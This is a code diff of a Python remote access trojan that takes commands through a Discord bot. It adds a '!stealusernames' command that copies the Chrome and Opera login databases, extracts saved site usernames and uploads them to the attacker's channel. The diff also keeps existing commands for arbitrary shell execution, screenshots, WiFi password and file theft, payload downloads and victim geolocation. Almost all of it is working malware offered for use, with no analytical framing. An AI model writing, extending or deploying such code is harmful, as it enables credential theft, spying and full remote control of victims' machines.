@@ -1,5 +1,4 @@
-# pip install discord pillow pyautogui requests
-# If not works after installion librares, try pip install discord pillow pyautogui requests pyscreeze
+# pip install discord pillow pyautogui requests pypiwin32
 
 import discord
 import socket
@@ -10,10 +9,13 @@ import uuid
 import requests
 import io
 import threading
+import sqlite3
+import shutil
 from tkinter import messagebox
+from urllib.parse import urlparse
 
 session = uuid.uuid4()
-TOKEN = "" # <---- Discord Token
+TOKEN = "" 
 
 current_dir = os.getcwd()
 intents = discord.Intents.default()
@@ -56,7 +58,7 @@ async def on_ready():
             f"📍 Country: `{country}`\n"
             f"Session: `{session}`\n"
             "--- Commands ---\n"
-            "`!cmd <command>` | `!screen` | `!stealwifipasswords` | `!chatsendmsg <text>`\n"
+            "`!cmd <command>` | `!screen` | `!stealwifipasswords` | `!stealusernames`\n"
             "`!stealfile <file>` | `!saveoncomputer <link>` | `!stealpublicaddress` | `!stealwifiaddresses` "
         )
         await channel_ref.send(header)
@@ -90,6 +92,40 @@ async def on_message(message):
         except Exception as e:
             await message.channel.send(f"❌ WiFi Error: {e}")
 
+    elif message.content == "!stealusernames":
+        paths = {
+            "Chrome": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data"),
+            "Opera": os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera Stable", "Login Data"),
+            "Opera GX": os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera GX Stable", "Login Data")
+        }
+        temp_dir = os.environ.get("TEMP")
+        temp_db = os.path.join(temp_dir, "browser_tmp.db")
+        output_file = os.path.join(temp_dir, "extracted_users.txt")
+        all_data = set()
+
+        for browser_name, db_path in paths.items():
+            if os.path.exists(db_path):
+                try:
+                    shutil.copyfile(db_path, temp_db)
+                    conn = sqlite3.connect(temp_db)
+                    cursor = conn.cursor()
+                    cursor.execute("SELECT origin_url, username_value FROM logins")
+                    for raw_url, user in cursor.fetchall():
+                        if user:
+                            domain = urlparse(raw_url).netloc.replace("www.", "")
+                            if domain: all_data.add(f"[{browser_name}] {domain}: {user}")
+                    conn.close()
+                    os.remove(temp_db)
+                except: continue
+
+        if all_data:
+            with open(output_file, "w", encoding="utf-8") as f:
+                f.write("\n".join(sorted(all_data)))
+            await message.channel.send(file=discord.File(output_file))
+            os.remove(output_file)
+        else:
+            await message.channel.send("❌ No usernames found.")
+
     elif message.content == "!screen":
         path = os.path.join(os.environ.get('TEMP', os.getcwd()), "s.png")
         try:
@@ -112,27 +148,23 @@ async def on_message(message):
 
     elif message.content.startswith("!saveoncomputer "):
         url = message.content[len("!saveoncomputer "):].strip()
-        filename = url.split("/")[-1].split("?")[0]
-        if not filename: filename = "uploaded_file"
-        
+        filename = url.split("/")[-1].split("?")[0] or "uploaded_file"
         path = os.path.join(current_dir, filename)
         try:
             r = requests.get(url, stream=True)
             if r.status_code == 200:
                 with open(path, 'wb') as f:
-                    for chunk in r.iter_content(chunk_size=8192):
-                        f.write(chunk)
-                await message.channel.send(f"✅ File uploaded and saved as: `{filename}`")
+                    for chunk in r.iter_content(chunk_size=8192): f.write(chunk)
+                await message.channel.send(f"✅ Saved as: `{filename}`")
             else:
-                await message.channel.send(f"❌ Error: Server returned status {r.status_code}")
+                await message.channel.send(f"❌ Status {r.status_code}")
         except Exception as e:
-            await message.channel.send(f"❌ Upload Error: {e}")
+            await message.channel.send(f"❌ Error: {e}")
 
     elif message.content.startswith("!chatsendmsg "):
         announcemsg = message.content[len("!chatsendmsg "):].strip()
-        userip = socket.gethostbyname(socket.gethostname())
         threading.Thread(target=show_popup, args=(announcemsg,), daemon=True).start()
-        await message.channel.send(f"✅ Pop-up sent to `{userip}`. Bot is still responsive.")
+        await message.channel.send(f"✅ Pop-up sent.")
     
     elif message.content == "!stealwifiaddresses":
         try:
@@ -140,66 +172,37 @@ async def on_message(message):
             s.connect(("8.8.8.8", 80))
             local_ip = s.getsockname()[0]
             s.close()
-
-            
             gateway = subprocess.check_output("powershell (Get-NetRoute -DestinationPrefix 0.0.0.0/0).NextHop", shell=True).decode().strip()
-
-            output = (
-                f"Hostname: {socket.gethostname()}\n"
-                f"IPv4 Address: {local_ip}\n"
-                f"Default Gateway: {gateway}"
-            )
+            output = f"Hostname: {socket.gethostname()}\nIPv4: {local_ip}\nGateway: {gateway}"
             await send_msg(message.channel, output)
         except Exception as e:
             await message.channel.send(f"Error: {e}")
-    
 
     elif message.content == "!stealpublicaddress":
         try:
-            #
-            response = requests.get('https://ipinfo.io/json', timeout=10)
-            data = response.json()
-            
-            #
+            data = requests.get('https://ipinfo.io/json', timeout=10).json()
             ip = data.get('ip', 'N/A')
-            isp_response = requests.get(f'http://ip-api.com/json/{ip}?fields=isp', timeout=10).json()
-            isp = isp_response.get('isp', 'N/A')
-
-            address_info = (
-                f"🌐 Public IP Address: `{ip}`\n"
-                f"🏙️ City: `{data.get('city', 'N/A')}`\n"
-                f"🌍 Region: `{data.get('region', 'N/A')}`\n"
-                f"🚩 Country: `{data.get('country', 'N/A')}`\n"
-                f"🏢 ISP: `{isp}`\n"
-                f"📍 Location: `{data.get('loc', 'N/A')}`\n"
-                f"📮 Postal: `{data.get('postal', 'N/A')}`"
-            )
-            await message.channel.send(address_info)
+            isp = requests.get(f'http://ip-api.com/json/{ip}?fields=isp', timeout=10).json().get('isp', 'N/A')
+            info = f"🌐 IP: `{ip}`\n🏙️ City: `{data.get('city', 'N/A')}`\n🏢 ISP: `{isp}`"
+            await message.channel.send(info)
         except Exception as e:
-            await message.channel.send(f"❌ Error fetching public address: {e}")
+            await message.channel.send(f"❌ Error: {e}")
 
     elif message.content.startswith("!cmd "):
         cmd = message.content[5:].strip()
         if cmd.startswith("cd "):
-            new_path = cmd[3:].strip()
-            try:
-                temp_path = os.path.abspath(os.path.join(current_dir, new_path))
-                if os.path.isdir(temp_path):
-                    current_dir = temp_path
-                    await message.channel.send(f"📍 Directory: `{current_dir}`")
-                else:
-                    await message.channel.send("❌ Error: Directory not found.")
-            except Exception as e:
-                await message.channel.send(f"❌ Error: {e}")
+            new_path = os.path.abspath(os.path.join(current_dir, cmd[3:].strip()))
+            if os.path.isdir(new_path):
+                current_dir = new_path
+                await message.channel.send(f"📍 Directory: `{current_dir}`")
+            else:
+                await message.channel.send("❌ Not found.")
             return
         try:
-            result = subprocess.run(
-                cmd, shell=True, capture_output=True, text=True, 
-                encoding="cp852", errors="replace", cwd=current_dir
-            )
-            output = (result.stdout or result.stderr or "Executed (no output).").strip()
+            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, encoding="cp852", errors="replace", cwd=current_dir)
+            output = (result.stdout or result.stderr or "Executed.").strip()
             await send_msg(message.channel, output)
         except Exception as e:
-            await message.channel.send(f"Error executing command: {e}")
+            await message.channel.send(f"Error: {e}")
 
 client.run(TOKEN)
